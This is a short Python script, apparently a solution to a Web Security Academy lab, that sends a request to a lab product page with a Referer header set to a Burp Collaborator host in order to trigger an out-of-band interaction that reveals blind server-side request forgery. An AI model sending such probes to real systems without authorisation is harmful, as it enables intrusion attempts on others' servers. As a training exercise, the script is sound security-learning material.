import requests

# Replace with the actual vulnerable URL
url = "https://0a2b009c04c5d3268243d48f0034006e.web-security-academy.net/product?productId=1"

# Send the GET request with the crafted Referer header pointing to Burp Collaborator
response = requests.get(url, headers={'referer': "https://burpcollaborator.net"})

# Check the response to ensure it went through successfully
print(f"Status Code: {response.status_code}")
print(response.text)
